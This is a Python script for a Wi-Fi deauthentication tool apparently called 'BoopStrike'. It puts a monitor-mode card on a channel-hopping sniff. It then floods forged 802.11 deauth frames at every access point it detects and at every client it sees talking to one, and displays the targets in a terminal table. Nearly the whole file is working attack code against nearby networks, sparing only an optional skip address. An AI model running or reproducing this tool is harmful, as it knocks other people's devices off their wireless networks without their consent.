#!/usr/bin/env python
# -*- coding: utf-8 -*-

__year__    = [2016, 2017]
__status__  = "Testing"
__contact__ = "jacobsin1996@gmail.com"

# Imports
import argparse
import logging
import signal

import pyric.pyw as pyw

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from os import system, path, getuid, uname
from random import choice
from scapy.all import *
from sys import exit, stdout, stderr
from threading import Thread
from time import sleep, time


conf.verb = 0

Channel_Hopper_Flag = True

Mac_Filter = None
Print_Flag = True
Start_Time = 0
Mac_Filter_Channel = ""

Ignore_Broadcast = ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "01:80:c2:00:00:00"]
Ignore_Multicast = ["01:00", "01:80:c2", "33:33"]

Access_Points = []
Clients = []
Deauth_Dict = {"Client":[], "APS": []}


# CLASSES
class c:
    H  = "\033[95m" # Magenta
    B  = "\033[94m" # Blue
    W  = "\033[93m" # Yellow
    G  = "\033[92m" # Green
    F  = "\033[91m" # Red
    E  = "\033[0m"  # Clear
    Bo = "\033[1m"  # Bold


class Configuration:
    def __init__(self):
        self.check_root()
        self.check_op()
        self.channel = 0
        return

    def user_force_variables_static(self):
        self.printer = True
        return

    def parse_interface(self, interface):
        if interface in pyw.interfaces() and pyw.modeget(interface) == "monitor":
            self.interface = interface
        else:
            print(c.F + " [-] Non Monitor card selected.")
            exit(0)
        return

    def parse_freq(self, freq):
        self.frequency = freq
        return

    def parse_channel(self, channel):
        _5_channels_ = [
            36, 40, 44,
            48, 52, 56,
            60, 64, 100,
            104, 108, 112,
            116, 132, 136,
            140, 149, 153,
            157, 161, 165
        ]

        if channel == None:
            if (self.frequency) == "2":
                self.hop = True
            elif str(self.frequency) == "5":
                self.hop = True
            else:
                print(c.F+" [-] Channel Setting incorrect.")
                exit(0)

            self.channel = None

        elif channel != None:
            if str(self.frequency) == "2" and int(channel) in xrange(1, 12):
                    self.hop = False
            elif str(self.frequency) == "5" and int(channel) in _5_channels_:
                    self.hop = False
            else:
                print(c.F+" [-] Channel Setting incorrect."+c.E)
                exit(0)

            self.channel = channel

        return

    def parse_mac_filter(self, mac_filter):
        self.mac_filter = mac_filter
        return

    def parse_skip(self, skip):
        self.skip = skip
        return

    def parse_packets(self, packets):
        self.packets = int(packets)
        return

    def parse_args(self):
        parser = argparse.ArgumentParser()

        parser.add_argument(
            "-i",
            "--interface",
            action="store",
            dest="interface",
            help="select an interface",
            required=True)

        parser.add_argument(
            "-f",
            "--frequency",
            action="store",
            default="2",
            dest="freq",
            help="select a frequency (2/5)",
            choices=["2", "5"])

        parser.add_argument(
            "-c",
            "--channel",
            action="store",
            default=None,
            dest="channel",
            help="select a channel")

        parser.add_argument(
            "-a",
            "--accesspoint",
            action="store",
            default=None,
            dest="access_mac",
            help="Command for a specific mac addr.")

        parser.add_argument(
            "-s",
            "--skip",
            action="store",
            default=None,
            dest="skip",
            help="Mac to not deauth (Usually your own...)")

        parser.add_argument(
            "-p",
            "--packets",
            action="store",
            default=1,
            dest="packets",
            help="How many deauth packets to send, more than 5 is usually unneccessary.")

        results = parser.parse_args()

        self.parse_interface(results.interface)
        self.parse_freq(results.freq)
        self.parse_channel(results.channel)
        self.parse_mac_filter(results.access_mac)
        self.parse_skip(results.skip)
        self.parse_packets(results.packets)

        self.user_force_variables_static()
        return

    def check_root(self):
        if getuid() != 0:
            print(c.F+" [-] User is not Root.")
            exit()
        return

    def check_op(self):
        if uname()[0].startswith("Linux") and not "Darwin" not in uname()[0]:
            print(c.F+" [-] Wrong OS.")
            exit()
        return


def handler_beacon(packet):
    global Mac_Filter_Channel
    global Mac_Filter
    global Access_Points
    global Deauth_Dict

    destination = packet.addr1
    source = packet.addr2
    mac = packet.addr3

    if packet.info and u"\x00" not in "".join([x if ord(x) < 128 else "" for x in packet.info]):
        name = packet.info.decode("utf-8")
    else:
        name = "<len: "+str(len(packet.info))+">"

    if mac == Mac_Filter:
        Mac_Filter_Channel = configuration.channel

    if mac not in Access_Points and mac != configuration.skip:
        Access_Points.append(mac)
        Deauth_Dict["APS"].append( [mac, configuration.channel, name[:15]] )

    if mac != configuration.skip:
        send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(configuration.packets))

    return


def handler_data(packet):
    global Access_Points
    global Clients
    global Deauth_Dict

    address1 = packet.addr1
    address2 = packet.addr2
    address3 = packet.addr3

    if address1 in Access_Points:
        if address2 != configuration.skip and address1 != configuration.skip:
            send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(configuration.packets))

            if address2 not in Clients:
                Clients.append(address2)
                Deauth_Dict["Client"].append( [address2, address1, configuration.channel ] )

    elif address2 in Access_Points:
        if address1 != configuration.skip and address2 != configuration.skip:
            send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(configuration.packets))

            if address1 not in Clients:
                Clients.append(address1)
                Deauth_Dict["Client"].append( [address1, address2, configuration.channel ] )

    return


def channel_hopper(configuration):
    global Channel_Hopper_Flag
    global Mac_Filter_Channel

    interface = configuration.interface
    frequency = configuration.frequency

    if frequency == "2":
        __FREQS__ = {
            "2.412": 1, "2.417": 2, "2.422": 3,
            "2.427": 4, "2.432": 5, "2.437": 6,
            "2.442": 7, "2.447": 8, "2.452": 9,
            "2.457": 10, "2.462": 11
            }

        for channel in ["2.412", "2.437", "2.462"]:
            system("sudo iwconfig "+interface+" freq "+channel+"G")
            configuration.channel = __FREQS__[channel]
            sleep(3)

    elif frequency == "5":
        __FREQS__ = {
            "5.180": 36, "5.200": 40, "5.220": 44,
            "5.240": 48, "5.260": 52, "5.280": 56,
            "5.300": 60, "5.320": 64, "5.500": 100,
            "5.520": 104, "5.540": 108, "5.560": 112,
            "5.580": 116, "5.660": 132, "5.680": 136,
            "5.700": 140, "5.745": 149, "5.765": 153,
            "5.785": 157, "5.805": 161, "5.825": 165
        }

    while Channel_Hopper_Flag == True:
        if str(Mac_Filter_Channel) != "":
            channel = __FREQS__.keys()[__FREQS__.values().index(Mac_Filter_Channel)]
            system("sudo iwconfig "+interface+" freq "+channel+"G")
            configuration.channel = Mac_Filter_Channel
            break

        channel = str(choice(__FREQS__.keys()))
        system("sudo iwconfig "+interface+" freq "+channel+"G")

        configuration.channel = __FREQS__[channel]

        sleep(3)
    return


def sniff_packets(packet):
    global Mac_Filter
    global Ignore_Broadcast

    if (Mac_Filter == None or (packet.addr1 == Mac_Filter or packet.addr2 == Mac_Filter)):

        if packet.type == 0:
            if packet.subtype == 8:
                handler_beacon(packet)

        elif packet.type in [1, 2]:
            if check_valid(packet.addr1) and check_valid(packet.addr2):
                handler_data(packet)

    return


def check_valid(mac):
    global Ignore_Broadcast
    global Ignore_Multicast

    if not mac:
        return False

    if mac in Ignore_Broadcast:
        return False

    for item in Ignore_Multicast:
        if mac.startswith(item):
            return False
    return True


def start_sniffer(configuration):
    sniff(iface=configuration.interface, prn=sniff_packets, store=0)
    return


def printer(configuration):
    global Deauth_Dict
    global Start_Time
    global Access_Points
    global Clients

    typetable = "simple"
    timeout = 1.5

    while True:
        wifis = []
        for item in Deauth_Dict["APS"]:
            wifis.append(item)

        clients = []
        for item in Deauth_Dict["Client"]:
            clients.append(item)

        wifis.sort(key=lambda x: (x[1], x[2]))
        clients.sort(key=lambda x: (x[2]))

        time_elapsed = int(time() - Start_Time)

        if time_elapsed < 60:
            printable_time = seconds = str(int(time_elapsed % 60))+" s"
        else:
            printable_time = str(int(time_elapsed / 60))+" m"

        stderr.write("\x1b[2J\x1b[H")

        print("{0}[+] {1}Time: {2}[{3}{4}{5}] {6}Striking: {7}[{8}{9}{10}] {11}".format(c.G, c.E, c.B, c.W, printable_time, c.B, c.E, c.B, c.W, configuration.channel, c.B, c.E))

        print( "\r\n{0}{1}{2}".format(c.F+"Mac Addr".ljust(19, " "), "Ch".ljust(4, " "), "SSID"+c.E) )
        for item in wifis:
            print( " {0}{1:<4}{2}".format(item[0].ljust(19, " "), item[1], item[2] ))

        print("\r\n{0}{1}{2}".format(c.F+"Mac".ljust(19, " "), "AP Mac".ljust(19, " "), c.E ))

        for item in clients:
            print( " {0}{1}".format(item[0].ljust(19, " "), item[1].ljust(19, " ") ))

        if timeout < 4:
            timeout += .05

        sleep(timeout)
    return


def set_size(height, width):
    stdout.write("\x1b[8;{rows};{cols}t".format(rows=height, cols=width))
    return


def int_main(configuration):
    global Channel_Hopper_Flag
    global Mac_Filter
    global Print_Flag
    global Start_Time
    global Deauth_List

    def signal_handler(*args):
        Print_Flag = False
        Channel_Hopper_Flag  = False

        print(c.G+"\r [+] "+c.E+"Commit to Exit.")
        exit(0)
        return 0

    signal.signal(signal.SIGINT, signal_handler)

    if configuration.hop == True:
        Hopper_Thread = Thread(target=channel_hopper, args=[configuration])
        Hopper_Thread.daemon = True
        Hopper_Thread.start()
    else:
        os.system("iwconfig " + configuration.interface + " channel " + configuration.channel)

    Start_Time = time()

    Mac_Filter = configuration.mac_filter

    Sniffer_Thread = Thread(target=start_sniffer, args=[configuration])
    Sniffer_Thread.daemon = True
    Sniffer_Thread.start()

    sleep(3)

    printer(configuration)

    return 0


def display_art():
    print(c.B+"""
  ____                    _____ _        _ _
 |  _ \                  / ____| |      (_) |
 | |_) | ___   ___  _ __| (___ | |_ _ __ _| | _____
 |  _ < / _ \ / _ \| '_ \\\___ \| __| '__| | |/ / _ \\
 | |_) | (_) | (_) | |_) |___) | |_| |  | |   <  __/
 |____/ \___/ \___/| .__/_____/ \__|_|  |_|_|\_\___|
                   | |
                   |_|
    """)
    print(c.H+"     Codename: Inland Taipan\r\n"+c.Bo)
    return


if __name__ == "__main__":
    set_size(35, 55)
    display_art()

    configuration = Configuration()
    configuration.parse_args()
    conf.iface = configuration.interface

    int_main(configuration)
    # 420 > Goal 400
